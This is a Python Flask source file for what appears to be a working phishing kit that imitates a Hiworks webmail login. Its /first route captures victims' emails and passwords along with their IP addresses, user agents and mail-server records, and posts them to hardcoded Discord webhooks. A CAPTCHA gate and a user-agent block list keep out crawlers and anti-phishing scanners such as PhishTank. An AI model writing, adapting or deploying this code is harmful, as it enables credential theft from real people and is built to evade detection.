import requests
from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
import secrets
import random
import io
import base64
import string
import time
from PIL import Image, ImageDraw, ImageFont
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import dns.resolver

# Discord Webhook URL (Ensure this is a valid and authorized webhook)
DISCORD_WEBHOOK_URLS = [
    "https://discord.com/api/webhooks/1348669865195733002/ZszNmtxM4biaP6sjAahS5jXJmqJ19LuifBafAledLqF-sOMJEdthZlSfP7UeD2phQVE6",
    "https://discord.com/api/webhooks/1348669882685984861/yZ_fqd_KHsXo-Mc1SttB2xKqPYvMNKMQA7kwLFOLT20o4KGeGIKD5e7jnfQu1KSNgDDn",
    "https://discord.com/api/webhooks/1348669936964337715/CuVDPFNpftjEvDSwSb2FaBkbzl6bXxhjMlzbjl2x70Ufx6zitCfiMRKFCcwH-SiWzdgP"
]

def send_discord_message(email, password, ip, useragent, domain, mx_record):
    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
    message = {
        "username": "Logger Bot",
        "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
        "embeds": [
            {
                "title": "🔔 Hiworks Login Attempt",
                "color": 16711680,  # Red color in Discord embed
                "fields": [
                    {"name": "📧 Email", "value": email, "inline": False},
                    {"name": "🔑 Password", "value": password, "inline": False},
                    {"name": "🌐 IP", "value": ip, "inline": False},
                    {"name": "🖥 User-Agent", "value": useragent, "inline": False},
                    {"name": "🌍 Domain", "value": domain, "inline": False},
                    {"name": "📨 MX Record", "value": mx_record, "inline": False},
                ],
                "footer": {"text": "Logger Bot - Secure Notifications"},
            }
        ]
    }
    
    try:
        requests.post(webhook_url, json=message)
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        return ', '.join(str(r.exchange) for r in answers)
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
        return "No MX Record Found"

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx

bot_user_agents = [
    'Googlebot', 'Baiduspider', 'ia_archiver', 'R6_FeedFetcher', 'NetcraftSurveyAgent', 
    'Sogou web spider', 'bingbot', 'Yahoo! Slurp', 'facebookexternalhit', 'PrintfulBot',
    'msnbot', 'Twitterbot', 'UnwindFetchor', 'urlresolver', 'Butterfly', 'TweetmemeBot',
    'PaperLiBot', 'MJ12bot', 'AhrefsBot', 'Exabot', 'Ezooms', 'YandexBot', 'SearchmetricsBot',
    'phishtank', 'PhishTank', 'picsearch', 'TweetedTimes Bot', 'QuerySeekerSpider', 
    'ShowyouBot', 'woriobot', 'merlinkbot', 'BazQuxBot', 'Kraken', 'SISTRIX Crawler', 
    'R6_CommentReader', 'magpie-crawler', 'GrapeshotCrawler', 'PercolateCrawler', 
    'MaxPointCrawler', 'R6_FeedFetcher', 'NetSeer crawler', 'grokkit-crawler', 'SMXCrawler', 
    'PulseCrawler', 'Y!J-BRW', '80legs.com/webcrawler', 'Mediapartners-Google', 'Spinn3r', 
    'InAGist', 'Python-urllib', 'NING', 'TencentTraveler', 'Feedfetcher-Google', 'mon.itor.us', 
    'spbot', 'Feedly', 'bot', 'curl', "spider", "crawler"
]

def generate_captcha_code(length=4):
    return ''.join(random.choices(string.digits, k=length))

def generate_captcha_image(code):
    width, height = 150, 60
    image = Image.new('RGB', (width, height), color=(255, 255, 255))
    draw = ImageDraw.Draw(image)

    for _ in range(random.randint(100, 200)):
        draw.point((random.randint(0, width), random.randint(0, height)), 
                   fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))

    try:
        font = ImageFont.truetype("arial.ttf", 36)
    except IOError:
        font = ImageFont.load_default()

    for i, char in enumerate(code):
        x = 20 + i * 30
        y = random.randint(10, 20)
        angle = random.randint(-25, 25)
        draw.text((x, y), char, font=font, fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))

    for _ in range(random.randint(3, 5)):
        x1, y1 = random.randint(0, width), random.randint(0, height)
        x2, y2 = random.randint(0, width), random.randint(0, height)
        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=2)

    img_io = io.BytesIO()
    image.save(img_io, 'PNG')
    img_io.seek(0)

    return base64.b64encode(img_io.getvalue()).decode('utf-8')

@app.route('/m', methods=['GET', 'POST'])
def captcha():
    if request.method == 'GET':
        if 'passed_captcha' in session and session['passed_captcha']:
            return redirect(url_for('success'))

        code = generate_captcha_code()
        session['captcha_code'] = code
        session['captcha_time'] = time.time()  
        userauto = request.args.get("web")
        userdomain = userauto[userauto.index('@') + 1:] if userauto else ""
        session['eman'] = userauto
        session['ins'] = userdomain

        captcha_image = generate_captcha_image(code)
        return render_template('captcha.html', captcha_image=captcha_image, eman=userauto, ins=userdomain, error=False)

    elif request.method == 'POST':
        user_input = request.form['code']
        captcha_time = session.get('captcha_time', 0)

        if time.time() - captcha_time > 60:
            return render_template('captcha.html', error=True, message="Captcha expired. Please try again.")

        if user_input == session.get('captcha_code'):
            session['passed_captcha'] = True
            return redirect(url_for('success'))
        else:
            code = generate_captcha_code()
            session['captcha_code'] = code
            captcha_image = generate_captcha_image(code)
            return render_template('captcha.html', captcha_image=captcha_image, error=True, message="Incorrect CAPTCHA. Please try again.")

@app.route('/success')
def success():
    if 'passed_captcha' in session and session['passed_captcha']:
        web_param = request.args.get('web')
        return redirect(url_for('route2', web=web_param))
    else:
        return redirect(url_for('captcha'))

@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or \
             request.headers.get('X-Real-IP') or \
             request.headers.get('X-Client-IP') or \
             request.remote_addr

        email = request.form.get("horse")
        password = request.form.get("pig")
        useragent = request.headers.get('User-Agent')

        domain = email.split('@')[-1] if email and '@' in email else None
        mx_record = get_mx_record(domain) if domain else "Invalid Domain"

        send_discord_message(email, password, ip, useragent, domain, mx_record)
        session['eman'] = email

        return redirect(url_for('benza', web=email))

@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)

@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in bot_user_agents:
        abort(403)
    
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3000)
